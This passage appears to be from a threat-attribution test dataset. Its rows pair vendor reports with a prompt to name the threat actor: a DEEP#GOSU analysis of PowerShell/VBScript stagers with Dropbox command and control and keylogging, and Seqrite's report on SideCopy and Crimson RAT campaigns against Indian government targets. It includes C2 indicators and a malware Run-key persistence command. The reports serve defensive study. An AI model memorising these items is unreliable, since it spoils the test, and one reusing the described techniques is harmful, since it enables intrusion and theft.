entries are spaced out and potentially reducing the volume of logged data to focus on periods of activity.  Encoding and file writing: All of the captured data is saved into the variable path $Path (“$env:appdata\Microsoft\Windows\Themes\version.xml“), using UTF-8 encoding (created and exfiltrated in stage 7.)	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: The Securonix Threat Research (STR) team has been monitoring a new campaign tracked as DEEP#GOSU likely associated with the [PLACEHOLDER] group, which features some new code/stagers as well as some recycled code and TTPs that were reported in the past. While the targeting of South Korean victims by the [PLACEHOLDER] group happened before, from the tradecraft observed it’s apparent that the group has shifted to using a new script-based attack chain that leverages multiple PowerShell and VBScript stagers to quietly infect systems. The later-stage scripts allow the attackers to monitor clipboard, keystroke, and other session activity.    The threat actors also employed a remote access trojan (RAT) software to allow for full control over the infected hosts, while the background scripts continued to provide persistence and monitoring capabilities.    All of the C2 communication is handled through legitimate services such as Dropbox or Google Docs allowing the malware to blend undetected into regular network traffic. Since these payloads were pulled from remote sources like Dropbox, it allowed the malware maintainers to dynamically update its functionalities or deploy additional modules without direct interaction with the system .    The malware used in the DEEP#GOSU campaign likely enters the system through typical means where the user downloads a malicious email attachment containing a zip file with a single disguised file using the extension: pdf.lnk, (IMG_20240214_0001.pdf.lnk) in this case.    Stage 1: Initial execution: LNK files [T1204.002]  The use of shortcut files, or .lnk files by threat actors is nothing new. However, in the case of DEEP#GOSU, the methodology behind the code execution is quite different from what we have typically seen in the past.    First, as seen in the figure below, the length of the command is quite impressive and it’s clear that the executed PowerShell is designed to perform several complex functions. Additionally, standing at about 2.2MB, it’s clear that there is more to this shortcut file than what meets the eye.        Figure 1: IMG_20240214_0001.pdf.lnk – command line execution    The embedded PowerShell script contained within the shortcut file is designed to take byte data from itself, which extracts embedded files, AESDecrypt and executes further malicious code downloaded from the internet (/step2/ps.bin) and clean up traces of its execution. The use of encryption and cloud services for payload retrieval indicates some level of sophistication intended to evade detection and analysis. This type of infrastructure typically takes much more time to set up and maintain versus simply hosting files on rented servers.    Let’s first analyze the reason that the shortcut file is over 2MB in size. Upon close analysis, the shortcut file appears to have an entire embedded PDF concatenated to it after tens of thousands of “A” characters. Those characters may be an attempt to pad the size of the file to evade AV detections.    The figure below demonstrates how this looks when using a hexadecimal editor to view the file’s raw data. On the left, we can see the end of the shortcut code which calls cmd.exe (to eventually call powershell.exe) and the start of the sequence of “A” characters. Over on the left the A’s terminate and the start of a PDF header appears!        Figure 2: Hex bytes of IMG_20240214_0001.pdf.lnk highlighting the embedded PDF file    So, the shortcut file has a concatenated PDF file attached to it. The PowerShell code contains a clever function that performs a few tasks. The PowerShell code below is taken from the code from within the shortcut file (figure 1) and then cleaned up a bit so it’s easier to read:        Figure 3: IMG_20240214_0001.pdf.lnk – extract PDF portion from itself    This portion of the script extracts the PDF portion of the .lnk file’s content based on specific byte positions which exists between byte values 2105824 and 2282653 ($len1 to $len2).  The script writes out the progress at each operational task such as “readfileend”, “exestart” and “exeend”.  The alias “sc” is used to instantiate a new object to hold the PDF file.  This extracted content is then eventually saved to a new variable $path, and then executed using the PowerShell Start-Process commandlet.  The PDF content is then executed which will then open in the system’s default PDF viewer which opens as “IMG_20240214_0001.pdf”.  All files are then deleted.  What makes this tactic clever is that there is technically no PDF file contained within the initial zip file sent to the victim. When the user clicks the PDF lure (shortcut file) they’re immediately presented with a PDF file thus removing any concern that anything unexpected happened.    The PDF lure document is in Korean and appears to be an announcement regarding the son of Korean Airlines CEO Choi Hyun (the late Choi Yul) and states that the son has passed away due to a car accident. The rest contains details and dates of the funeral hall.        Figure 4: IMG_20240214_0001.pdf lure document    In addition to extracting and executing the PDF document, the shortcut file also executes the malware’s next stage payload from a Dropbox URL (hxxps://content.dropboxapi[.]com/2/files/download/step2/ps.bin). Despite its name, the ps.bin file is actually another PowerShell script which we’ll dive into later.    Since Dropbox requires authentication, all of the required parameters are embedded into the shortcut’s original PowerShell script (figure 1). With the PowerShell code cleaned up, the portion of the script responsible for downloading and executing the next-stage payload ($newString) is highlighted below.        Figure 5: IMG_20240214_0001.lnk – download and invoke next-stage payload from Dropbox    To sum up, the PowerShell script contained with the shortcut file is designed to silently find and execute the specifically crafted malicious .lnk file (itself), extract and execute the embedded PDF lure document, authenticate, decrypt and execute further malicious code downloaded from Dropbox, and then clean up traces of its execution. The use of encryption and cloud services for payload retrieval indicates a level of sophistication intended to evade detection and analysis.    Stage 2: Invoked code from Dropbox [T1102]  At this stage, the initial shortcut file has downloaded and invoked a remote payload from Dropbox called ps3.bin. The PowerShell code contained within the .bin file defines a function (Load) that performs several operations which includes downloading, decompressing, and dynamically loading and executing .NET assembly code from a different Dropbox URL.    Define a decompression helper function (GzExtract):  This inner function takes a byte array as input in the form of GZIP compressed data.  Decompresses this data and return the resulting byte array  Dynamically loading .NET assemblies:  The script dynamically loads assemblies related to System.Drawing, System.Windows.Forms, and PresentationCore  This enables the script to use advanced graphical UI capabilities which have been used in the past for features such as screenshots or screen recording by Dark Pink malware among others.  Authenticating with Dropbox and downloading next-stage remote payload:  Similar to the shortcut file’s PowerShell script, it authenticates with Dropbox once again using a refresh token, client ID, and client secret to obtain an access token.  A file named r_enc.bin is downloaded from Dropbox (stage 3).  After downloading the file, it attempts to decompress the payload using the GzExtract function defined earlier.  The script implies this payload is a .NET assembly in binary form, though compressed to evade detection.  Dynamically loading and executing the .NET assembly:  It loads the decompressed .NET assembly into memory without writing it to disk which can help cut down AV detections.  It iterates through types and methods within the loaded assembly to find and invoke a specific method (makeProbe1). The invocation is commented out, but it suggests that the method would execute with a hardcoded parameter, which is partially shown and then truncated.  This dynamic loading and execution allow the malware to perform virtually any action the .NET framework supports, based on the code within the downloaded assembly.      Figure 6: Example of PowerShell ps.bin    In addition to the above the script also invokes a method on an object instance using reflection in PowerShell, with a parameter that appears to be a Base64-encoded string. The string can be seen in the figure below.        Figure 7: ps.bin PowerShell invokes next stage payloads    The $method variable is set up and holds a reference to a “MethodInfo” object, which represents a specific method of a class. The “$instance” variable contains the instance of the class which in turn contains the method you want to invoke. The string is encoded in Base64 and then passed as an argument to the method.    Since at this point the code is doing two pretty interesting things simultaneously, let’s follow the loading and execution of “r_enc.bin” from Dropbox further down (Stage 4) which is loaded from the following Dropbox URL:    hxxps://content.dropboxapi[.]com/2/files/download/step2/r_enc.bin    We’ll continue with the invocation of the new Base64 encoded method (Stage 4) further down.    Stage 3: TutClient [C# RAT] (r_enc.bin)  When analyzing the PowerShell script in Stage 2 we determined that the script once again reached back out to Dropbox and downloaded a compressed Base64 string. The file itself is indeed a binary file which can be easily confirmed using a tool such as CyberChef. If we place the large Base64 string (r_enc.bin) inside the input field, select “From Base64” and “Gunzip”, we see the MZ header and other common strings for Windows executables inside the output.        Figure 8: Decoding r_enc.bin in CyberChef    The decompressed binary file ends up being an open source RAT (remote access trojan), known as TruRat, TutRat or C# R.A.T. which generates a commonly named client called TutClient.exe.    As the name suggests, the RAT is coded in C# and is open source. Since the source of the application can be found online, we won’t go too deep into the binary code analysis portion as it’s available online, but rather discuss its capabilities.        Figure 9: C# RAT executable client overview    Currently this particular RAT software is quite old and likely to be picked up by most antivirus vendors. However, given the unique method in which this binary is loaded and executed directly into memory (stage2), it’s likely to skirt some detections.    Execution of the payload in memory, also known as “fileless” execution, is a technique used by attackers to evade detection by traditional file-based antivirus solutions. Since the payload does not touch the disk, it leaves fewer traces, making it harder for security tools to detect and mitigate the threat.    According to the C# Rat’s GitHub page, the malware supports a wide range of features including:    Keylogger  Remote desktop  Mic and cam spy  Remote Cmd prompt  Process and file manager  Fun menu (hiding desktop icons, clock, taskbar, showing messagebox, triggering Windows sound effects)  DDoS with target validation  Password manager (supporting: Internet Explorer, Google Chrome, Firefox)  Interestingly enough, this is not the first time that we’ve seen this RAT used against Korean targets. A year ago the [PLACEHOLDER] group was identified delivering TutRAT and xRAT payloads through other methods.    Stage 4: VBScript execution (invoked code from stage 2) [T1059.005]  Circling back to Stage 2, if you recall, we observed a large Base64 encoded string getting invoked. After decoding the string we reveal a VBScript code segment which once again is designed to connect back to Dropbox by interacting with specific web APIs.        Figure 10: Stage 4 VBScript execution – download info_sc.txt from Dropbox (from stage 2)    The next stage is downloaded from Dropbox in the same manner we observed during the last several stages. Using a unique client ID, refresh token and secret, the file “info_sc.txt” is downloaded from the URL:    hxxps://content.dropboxapi[.]com/2/files/download/step2/info_sc.txt    Once the file is downloaded, it is written to a VB Stream object then switches the stream’s type to text and reads it as a UTF-8 encoded string. This is a method to convert binary data (the downloaded file content) into a readable string.    The crucial part of this script is the “Execute” statement, which executes the string read from the stream as VBScript code. This means the downloaded content is not just data but executable code, which makes the purpose for Stage 4 run arbitrary VBScript code fetched from Dropbox.        Figure 11: Stage 4 VBScript execution execute downloaded code    With the code downloaded from Dropbox, parsed and then converted, it’s placed inside “convertedString” and then executed.    Lastly, the script dynamically writes a PowerShell file on the disk and then executes it (Stage 7). This file was written to:    c:\users\[redacted]\appdata\roaming\microsoft\windows\w568232.ps1    Originally the script dropped the file named w568232.ps12x , however it was immediately renamed to w568232.ps1 using the following command:    cmd /c rename c:\users\[redacted]\appdata\roaming\microsoft\windows\w568232.ps12x w568232.ps1    Stage 5: VBScript execution (info_sc.txt) [T1059.005]  If you thought at this point we were done with Dropbox stages, you might be right, depending on the OS version the victim system is running. But for now, a closer look at this script reveals several indications of more traditional malware such as persistence indicators and WMI (Windows Management Instrumentation) activity.    The script is quite complex, though it did not feature any form of obfuscation which needed to be decoded. Let’s go over some of the more interesting routines and functions to better understand its capabilities.    WMI Execution [T1047]  At the beginning of the script there is a WMProc Subroutine which uses WMI to execute commands on the system. It takes a single parameter p_cmd which specifies the executable or script that is launched by the WMI service.    Additionally, there is a commented out line with instructions to download, save and execute a remote .hwp document file. [PLACEHOLDER] has been known to use disguised hwp files in the past, so this could be an artifact of an older attack chain. The commented out line references a remote server at regard.co[.]kr, however we did not observe any network communication to that domain throughout the course of the DEEP#GOSU campaign.        Figure 12: Stage 5 VBScript execution – WMProc and TF functions    Scheduled tasks [T1053]  The TF function works with the Reg and Reg1 subroutines which are used to schedule tasks on the system. Additionally, the TF function formats a timestamp for scheduling, and the Reg subroutine actually schedules a new task. This task is configured to execute a script or command at a later time, ensuring that the malware maintains persistence on the system.        Figure 13: Stage 5 VBScript execution – Reg and Reg1 functions    Remote payload download  At this point the script checks the version of the operating system and branches its behavior accordingly. For OS versions prior to Windows 10, it uses Internet Explorer functionality to download and execute a script fetched from a remote server at    hxxp://gbionet[.]com/inc/basl/up1/list.php?query=6    After contacting the URL above, the script captures the “innerText” of the page’s body, which is the text content of the response from the server, excluding any HTML tags.    For systems running Windows 10 or later, it uses a PowerShell script which is saved into a single VBScript variable to download and execute a payload from Dropbox using similar methods we witnessed prior.        Figure 14: Stage 5 VBScript execution – Next stage download    The inclusion of Google Docs URLs in the PowerShell script encapsulated within the psTxt variable is a method used to dynamically retrieve configuration data for the Dropbox connection. This could be useful for when payloads, or Dropbox account data needs to be changed, without having to change the script itself.    As we witnessed previously, the PowerShell script uses a hard-coded password (pa55w0rd), and then executes the decrypted content. This also helps reduce the malware’s detection footprint. Using these types of services to fetch configuration data or payloads can blend in with legitimate network traffic, reducing the likelihood of network-based detection.        Figure 15: Stage 5 VBScript/PowerShell execution – invoke next stage    The decrypted content uses a predefined password and AES decryption. Since the downloaded content is encrypted another layer of protection against detection is added.    Interestingly enough, the $uh variable is not defined anywhere in the script. This is used by the Invoke-Command alias (icm) to execute a PowerShell scriptblock. This could be a mistake by the malware authors, or used in context with other more broad malware operations where it could be used with portions of code not included in the samples identified by the team.    Lastly, the decrypted content is then executed directly in memory using a PowerShell invoke-expression, which leads us into Stage 6!    Stage 6: PowerShell execution – system enumeration [T1082]  Circling back to PowerShell, the next script that gets executed is an interesting script which attempts to enumerate the victim system as much as it can. Once again, Dropbox is used, however rather than downloading the next-stage payload, it issues a carefully-crafted POST request to submit its enumeration findings.    As you can see in the data below, it formats the data into sections with headers containing plus signs on either side of the header text.        Figure 16: Stage 6 PowerShell system enumeration example    The script enumerates the following items:    Running processes (tasklist)  Firewall status for all profiles (Netsh Advfirewall show allprofiles)  Registered antivirus products via Security Center (AntiVirusProduct class from ROOT\SecurityCenter and ROOT\SecurityCenter2 namespaces)  User profile directories:  Desktop ($user_dir\Desktop)  Documents ($user_dir\Documents)  Downloads ($user_dir\Downloads)  Application data and start menu programs:  Recent documents ($appdata\Microsoft\Windows\Recent)  Start Menu Programs ($appdata\Microsoft\Windows\Start Menu\Programs)  Program files directories:  Default Program Files ($env:ProgramFiles)  Program Files (x86) for 64-bit systems ($env:ProgramFiles(x86))  All drives and their content, including:  Drive label, type, format  Directories and files within each accessible drive  Once the information is gathered it encrypts the data using AES functions similar to that of the AES decrypt functions we discussed earlier. The script then constructs an HTTP POST request to upload encrypted data. The script attempts to refresh an OAuth token for Dropbox using a client ID, secret, and refresh token, then uses this token to authorize an upload to Dropbox.        Figure 17: Stage 6 PowerShell upload enumeration data    Stage 7: stealth and persistence in PowerShell [T1041]  If you recall, this script is created and saved to the disk from Stage 5 (\appdata\roaming\microsoft\windows\w568232.ps1). The purpose of this script appears to be designed to serve as a tool for periodic communication with a command and control (C2) server via Dropbox. Its main purposes include encrypting and exfiltrating or downloading data.    Most of the script once again contains PowerShell code for handling Dropbox connections and AES encryption/decryptors however there are a few interesting functions worth mentioning.        Figure 18: stage 7 various functions inside w568232.ps1    To ensure persistent, stealthy operation, it contains unique functions for both mutex-based singleton execution ($bMute) and variable intervals for network connectivity (GetTimeInterval). The time is set to a random interval between 10000 seconds (2.78 hours). Essentially, the script acts as a versatile backdoor that allows attackers to continuously monitor and control their infected systems.    Stage 8: Keylogging [T1056.001]  The purpose of this (and final) script is to act as a keylogging and clipboard monitoring component to monitor and log user activity on the compromised system.    It achieves this by first obtaining access to Windows native APIs using .NET assemblies, and then using the Add-Type PowerShell module to call the Core class within the session. The script uses some targeted variable substitution obfuscation throughout the defined strings.        Figure 19: stage 8 obfuscated .NET assemblies    The script uses functions such as GetAsyncKeyState to monitor the state of individual keys on the keyboard, capturing key presses and releases.        Figure 20: stage 8 PowerShell keylogging functions    The PowerShell script includes functionality to monitor and log changes in the clipboard content. It does this by using the GetClipboardSequenceNumber function to retrieve the current clipboard sequence number, which changes anytime the content of the clipboard changes.    It then compares the current clipboard sequence number in $curClip with the previously stored sequence number in $oldClip. If they differ, it indicates the clipboard content has changed. If the format is verified as “text” it then uses [Windows.Clipboard]::GetText() to retrieve the new clipboard text.    Lastly, it appends the content into the $Path (Version.xml) variable using [System.IO.File]::AppendAllText.      Additional functionality:  Window monitoring: It uses both GetForegroundWindow and GetWindowText to track the active window and its title, enabling the script to log which application the user is interacting with alongside the captured keystrokes or clipboard.  System tick count: GetTickCount is also used to manage the timing of log entries (clipboard, keystrokes, etc), ensuring that entries are spaced out and potentially reducing the volume of logged data to focus on periods of activity.  Encoding and file writing: All of the captured data is saved into the variable path $Path (“$env:appdata\Microsoft\Windows\Themes\version.xml“), using UTF-8 encoding (created and exfiltrated in stage 7.)
https://www.seqrite.com/blog/pakistani-apts-escalate-attacks-on-indian-gov-seqrite-labs-unveils-threats-and-connections/	In the recent past, cyberattacks on Indian government entities by Pakistan-linked APTs have gained significant momentum. Seqrite Labs APT team has discovered multiple such campaigns during telemetry analysis and hunting in the wild. One such threat group, SideCopy, has deployed its commonly used AllaKore RAT in three separate campaigns over the last few weeks, where two such RATs were deployed at a time in each campaign. During the same events, its parent APT group [PLACEHOLDER] ([PLACEHOLDER]) continuously used Crimson RAT but with either an encoded or a packed version. Based on their C2 infrastructure, we were able to correlate these APTs, proving their sub-divisional relation once again. This blog overviews these campaigns and how a connection is established by looking at their previous attacks.    India is one of the most targeted countries in the cyber threat landscape where not only Pakistan-linked APT groups like SideCopy and [PLACEHOLDER] ([PLACEHOLDER]) have targeted India but also new spear-phishing campaigns such as Operation RusticWeb and FlightNight have emerged. At the same time, we have observed an increase in the sale of access to Indian entities (both government and corporate) by initial access brokers in the underground forums, high-profile ransomware attacks, and more than 2900 disruptive attacks such as DDoS, website defacement and database leaks by 85+ Telegram Hacktivist groups in the first quarter of 2024.    Threat Actor Profile    SideCopy is a Pakistan-linked Advanced Persistent Threat group that has been targeting South Asian countries, primarily the Indian defense and government entities, since at least 2019. Its arsenal includes Ares RAT, Action RAT, AllaKore RAT, Reverse RAT, Margulas RAT and more. [PLACEHOLDER] ([PLACEHOLDER]), its parent threat group with the same persistent targeting, shares code similarity and constantly updates its Linux malware arsenal. Active since 2013, it has continuously used payloads such as Crimson RAT, Capra RAT, Eliza RAT and Oblique RAT in its campaigns.    SideCopy    So far, three attack campaigns with the same infection chain have been observed, using compromised domains to host payloads. Instead of side-loading the Action RAT (DUser.dll) payload, as seen previously, two custom variants of an open-source remote agent called AllaKore are deployed as the final payload.        Fig. 1 – Attack Chain of SideCopy    Infection Process    Spear-phishing starts with an archive file containing a shortcut (LNK) in a double-extension format.  Opening the LNK triggers the MSHTA process, which executes a remote HTA file hosted on a compromised domain. The stage-1 HTA contains two embedded files, a decoy and a DLL, that are base64 encoded.  DLL is triggered to run in-memory where the decoy file is dropped & opened by it. As previously seen, the DLL creates multiple text files that mention the name “Mahesh Chand” and various other random texts.  Later, the DLL will download two HTA files from the same compromised domain to begin its second stage process.  Both the HTA contain embedded files, this time an EXE and two DLLs.  One of the DLLs is executed in-memory, which drops the remaining two files into the public directory after decoding them. Persistence on the final payload is set beforehand via the Run registry key. One example:  REG ADD “HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run” /V “issas” /t REG_SZ /F /D “C:\Users\Public\issas\issas.exe”        Fig. 2 – Files dropped in one of the campaigns    Lastly, both the final payloads, which is AllaKore RAT, are executed and connected with the same IP but different port numbers for C2 communication. The final DLL is not side-loaded but is completely legitimate and old file.  An in-depth analysis of each stage can be checked in our previous blogs and whitepapers. It contains timers for timeout, reconnection, clipboard, and separate sockets for desktop, files, and keyboard. The functionality of AllaKore includes:    Gathering system information  Enumerating files and folders  Upload and execute files  Keylogging  Steal clipboard data  The Delphi-based AllaKore RATs have the following details campaign-wise:    Campaign        Internal Name   Compiler Timestamp  1       msmediaGPview  msmediarenderapp    06-Mar-2024  2       msvideolib  msrenderapp    18-Mar-2024  3       msvideolib  msrenderapp    01-Apr-2024  Initially, the RAT sends and receives ping-pong commands, listening to the C2 for commands to know that the connection is alive. Both RAT payloads run together, complementing each other, as seen in the network traffic below. Their sizes are also different: one is 3.2 MB, and the other almost doubles to 7 MB, like Double Action RAT. A connection ID based on the system information is created for each instance.        Fig. 3 – Network traffic for port 9828        Fig. 4 – Network traffic for port 6663    List of encrypted strings used for C2 communication in smaller-sized payloads:    Encrypted       Decrypted  7oYGAVUv7QVqOT0iUNI     SocketMain  7oYBFJGQ        OK  7o4AfMyIMmN     Info  7ooG0ewSx5K     PING  7ooGyOueQVE     PONG  7oYCkQ4hb550    Close  7oIBPsa66QyecyD NOSenha  7oIDcXX6y8njAD  Folder  7oIDaDhgXCBA    Files  7ooD/IcBeHXEooEVVuH4BB  DownloadFile  7o4H11u36Kir3n4M4NM     UploadFile  Sx+WZ+QNgX+TgltTwOyU4D  Unknown (Windows)  QxI/Ngbex4qIoVZBMB      Windows Vista  QxI/Ngbex46Q    Windows 7  QxI/Ngbex4aRKA  Windows 10  QxI/Ngbex4KTxLImkWK     Windows 8.1/10  Various file operations have been incorporated, including create, delete, execute, copy, move, rename, zip, and upload, which are part of the AllaKore agent. These commands were found in the bigger payload.        Fig. 5 – File move operation        Fig. 6 – Commands in the second payload    The DLL files dropped are not sideloaded by the AllaKore RAT, and they are legitimate files that could be later used for malicious purposes. These are Microsoft Windows-related libraries, but only a few contain a valid signature.    Dropped DLL Name          PDB    Description    Compilation Timestamp  msdr.dll        Windows.Management.Workplace.WorkplaceSettings.pdb      Windows Runtime WorkplaceSettings DLL   2071-08-19  braveservice.dll        dbghelp.pdb     Windows Image Helper    2052-02-25  salso.dll       D3d12core.pdb   Direct3D 12 Core Runtime        1981-03-18  salso.dll       OrtcEngine.pdb  Microsoft Skype ORTC Engine     2020-01-07  salso.dll       msvcp120d.amd64.pdb     Microsoft® C Runtime Library    2013-10-05  FI_Ejec13234.dll        IsAppRun.pdb    TODO:<> 2013-10-15  Decoys    Two decoy files have been observed, where one was used in previous campaigns in February-March 2023. The date in the document, “21 December 2022,” has been removed, and the bait’s name has been changed to indicate March 2024 – “Grant_of_Risk_and_HardShip_Allowances_Mar_24.pdf.” As the name suggests, it is an advisory from 2022 on allowance grants to Army officers under India’s Ministry of Defence. This is used in two of the three campaigns.        Fig. 7 – Decoy (1)    The second decoy is related to the same allowance category and mentions payment in arrears form. This is another old document used previously, dated 19 January 2023.        Fig. 8 – Decoy (2)    Infrastructure and Attribution    The compromised domains resolve to the same IP addresses used in previous campaigns, as seen with the passive DNS replication since last year.    IP      Compromised Domain      Campaign  151.106.97[.]183        inniaromas[.]com  ivinfotech[.]com    November 2023       revivelife.in   March 2024  vparking[.]online       April 2024  162.241.85[.]104        ssynergy[.]in   April 2023  elfinindia[.]com        May 2023  occoman[.]com   August 2023  sunfireglobal[.]in      October 2023  masterrealtors[.]in     November 2023  smokeworld[.]in March 2024  C2 servers of AllaKore RAT are registered in Germany to AS51167 – Contabo GmbH, commonly used by SideCopy. Based on the attack chain and arsenal used, these campaigns are attributed to SideCopy, which has high confidence and uses similar infrastructure to carry out the infection.    164.68.102[.]44 vmi1701584.contaboserver.net  213.136.94[.]11 vmi1761221.contaboserver.net  The following chart depicts telemetry hits observed for all three SideCopy campaigns related to AllaKore RAT. The first two campaigns indicate a spike twice in March, whereas the third campaign is observed during the second week of April.        Fig. 9 – SideCopy campaign hits    [PLACEHOLDER]    Many Crimson RAT samples are seen regularly on the VirusTotal platform, with a detection rate of around 40-50. In our threat hunting, we have found new samples but have had very few detections.        Fig. 10 – Infection Chain of [PLACEHOLDER]    Analyzing the infection chain to observe any changes, we found that the Crimson RAT samples are not embedded directly into the maldocs as they usually are. This time, the maldoc in the XLAM form contained three objects: the decoy and base64-encoded blobs.        Fig. 11 – Additional Functions in Macro    After extracting the VBA macro, we see additional functions for reading a file, decoding base64, and converting binary to string. The macro reads and decodes the two base64 blobs embedded inside the maldoc. This contains archived Crimson RAT executed samples, after which the decoy file is opened.        Fig. 12 – VBA infection flow    Crimson RAT    The final RAT payloads contain the same functionality where 22 commands for C2 communication are used. As the detection rate is typically high for this Crimson RAT, we see a low rate for both these samples. These .NET samples have compilation timestamp of 2024-03-17 and PDB as:    “C:\New folder\mulhiar tarsnib\mulhiar tarsnib\obj\Debug\mulhiar tarsnib.pdb”    Fig. 13 – Detection count on VT    No major changes were observed when the C2 commands were checked along with the process flow. IP of the C2 is 204.44.124[.]134, which tries to check the connection with 5 different ports – 9149, 15597, 18518, 26791, 28329. Below, you can find C2 commands for some of the recent samples (compile-timestamp-wise) of Crimson RAT, which uses similar 22 to 24 commands. All of these are not packed (except the last two) and have the same size range of 10-20 MB.        Fig. 14 – C2 commands of Crimson RAT for recent samples    As seen in BinDiff, similarity with previous samples is always more than 75%. Changes in the order of the command interpreted by the RAT were only found with numerical addition or splitting the command in two.        Fig. 15 – Comparing similarity between Crimson RAT variants    Additionally, two new samples that were obfuscated with Eziriz’s .NET Reactor were also found which are named ‘ShareX’ and ‘Analytics Based Card.’ [PLACEHOLDER] has used different packers and obfuscators like ConfuserEx, Crypto Obfusator, and Eazfuscator, in the past. Compared with the previous iteration, the regular ones contain 22-24 commands as usual, whereas the obfuscated one contains 40 commands. The C2, in this case, is juichangchi[.]online trying to connect with four ports – 909, 67, 65, 121. A few of these C2 commands don’t have functionality yet, but they are similar to the ones first documented by Proofpoint. The list of all 22 commands and their functionality can be found in our previous whitepaper on [PLACEHOLDER].        Fig. 16 – Comparison after deobufscation    Decoys    The maldoc named “Imp message from dgms” contains DGMS, which stands for India’s Directorate General of Mines Safety. The decoy document contains various points relating to land and urban policies associated with military or defense, showing its intended targeting of the Indian Government. Another maldoc named “All details” is empty but has a heading called posting list.        Fig. 17 – DGMS decoy    Crimson Keylogger    A malicious .NET file with a similar PDB naming convention to Crimson RAT was recently seen, with a compilation timestamp of 2023-06-14. Analysis led to a keylogger payload that captures all keyboard activity.    PDB: e:\vdhrh madtvin\vdhrh madtvin\obj\Debug\vdhrh madtvin.pdb  Apart from capturing each keystroke and writing it into a file, it collects the name of the current process in the foreground. Toggle keys are captured separately and based on key combinations; clipboard data is also copied to the storage file.        Fig. 18 – Crimson Keylogger    Correlation    Similar to the code overlaps seen previously between SideCopy and [PLACEHOLDER] in Linux-based payloads, based on the domain used as C2 by [PLACEHOLDER], we pivot to see passive DNS replications of the domain using Virus Total and Validin. The C2 for the above two packed samples resolved to different IPs – 176.107.182[.]55 and 162.245.191[.]214, as seen in the below timeline, giving us when they went live.        Fig. 19 – Timeline of C2 domain    This also leads us to two additional IP addresses: 155.94.209[.]4 and 162.255.119[.]207. The first one is communicating with a payload having detections of only 7/73 on Virus Total, whereas the latter is not associated with new malware. The malware seems to be another .NET Reactor packed payload with compile timestamp as 2039-02-24 but small (6.55 MB) compared to the Crimson RAT payloads.        Fig. 20 – Deobufscated AllaKore RAT    The default name of the sample is an Indian language word “Kuchbhi.pdb” meaning anything. After deobfuscation, we see C2 commands that are similar to the above Delphi-based AllaKore RAT deployed by SideCopy. Only this time it is in a .NET variant with the following five commands:    C2 Command      Function  LIST_DRIVES     Retrieve and send list of drives on the machine  LIST_FILES      Enumerate files and folder in the given path  UPLOAD_FILE     Download and execute file  PING    Listening to C2 and send PONG for live status  getinfo Send username, machine name and OS information  Persistence is set in two ways, run registry key or through the startup directory.    Overlap of code usability was found in SideCopy’s Linux-based stager payload of Ares RAT and that of [PLACEHOLDER]’s Linux-based python malware called Poseidon and other desktop utilities. Here we see similar code overlaps and possibly sharing of C2 infrastructure between the two groups. AllaKore RAT (open source) has been associated with SideCopy since its discovery in 2019 along with Action RAT payload. Similarly, Crimson RAT is linked to be an in-house toolset of [PLACEHOLDER].    Infrastructure and Attribution    Looking at the C2, the same target names used previously by [PLACEHOLDER] were identified that are running Windows Server 2012 and 2022 versions.    IP      ASN     Organization    Country Name  204.44.124[.]134        AS8100  QuadraNet Inc   United States   WIN-P9NRMH5G6M8  162.245.191[.]214       AS8100  QuadraNet Inc   United States   WIN-P9NRMH5G6M8  155.94.209[.]4  AS207083        Quadranet Inc   Netherlands     WIN-P9NRMH5G6M8  176.107.182[.]55        AS47987 Zemlyaniy Dmitro Leonidovich    Ukraine WIN-9YM6J4IRPC  Based on this correlation and previous attack chains, these campaigns are attributed to both [PLACEHOLDER] and SideCopy groups with high confidence, establishing yet another strong connection between them.    Conclusion    Persistent targeting of the Indian government and defense entities by Pakistan-linked APT groups has continued, where new operations have emerged with similar threats. SideCopy has deployed its well—associated AllaKore RAT in multiple campaigns, whereas its parent group, [PLACEHOLDER] ([PLACEHOLDER]), is continuously using Crimson RAT, T, making changes to evade detections.    As the threat landscape shifts due to various geopolitical events like the Israel-Iran conflict, India is bound to get targeted continuously. On the verge of India’s upcoming election, it is suggested that necessary precautions be taken and that people stay protected amidst the increasing cybercrime.	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: In the recent past, cyberattacks on Indian government entities by Pakistan-linked APTs have gained significant momentum. Seqrite Labs APT team has discovered multiple such campaigns during telemetry analysis and hunting in the wild. One such threat group, SideCopy, has deployed its commonly used AllaKore RAT in three separate campaigns over the last few weeks, where two such RATs were deployed at a time in each campaign. During the same events, its parent APT group [PLACEHOLDER] ([PLACEHOLDER]) continuously used Crimson RAT but with either an encoded or a packed version. Based on their C2 infrastructure, we were able to correlate these APTs, proving their sub-divisional relation once again. This blog overviews these campaigns and how a connection is established by looking at their previous attacks.    India is one of the most targeted countries in the cyber threat landscape where not only Pakistan-linked APT groups like SideCopy and [PLACEHOLDER] ([PLACEHOLDER]) have targeted India but also new spear-phishing campaigns such as Operation RusticWeb and FlightNight have emerged. At the same time, we have observed an increase in the sale of access to Indian entities (both government and corporate) by initial access brokers in the underground forums, high-profile ransomware attacks, and more than 2900 disruptive attacks such as DDoS, website defacement and database leaks by 85+ Telegram Hacktivist groups in the first quarter of 2024.    Threat Actor Profile    SideCopy is a Pakistan-linked Advanced Persistent Threat group that has been targeting South Asian countries, primarily the Indian defense and government entities, since at least 2019. Its arsenal includes Ares RAT, Action RAT, AllaKore RAT, Reverse RAT, Margulas RAT and more. [PLACEHOLDER] ([PLACEHOLDER]), its parent threat group with the same persistent targeting, shares code similarity and constantly updates its Linux malware arsenal. Active since 2013, it has continuously used payloads such as Crimson RAT, Capra RAT, Eliza RAT and Oblique RAT in its campaigns.    SideCopy    So far, three attack campaigns with the same infection chain have been observed, using compromised domains to host payloads. Instead of side-loading the Action RAT (DUser.dll) payload, as seen previously, two custom variants of an open-source remote agent called AllaKore are deployed as the final payload.        Fig. 1 – Attack Chain of SideCopy    Infection Process    Spear-phishing starts with an archive file containing a shortcut (LNK) in a double-extension format.  Opening the LNK triggers the MSHTA process, which executes a remote HTA file hosted on a compromised domain. The stage-1 HTA contains two embedded files, a decoy and a DLL, that are base64 encoded.  DLL is triggered to run in-memory where the decoy file is dropped & opened by it. As previously seen, the DLL creates multiple text files that mention the name “Mahesh 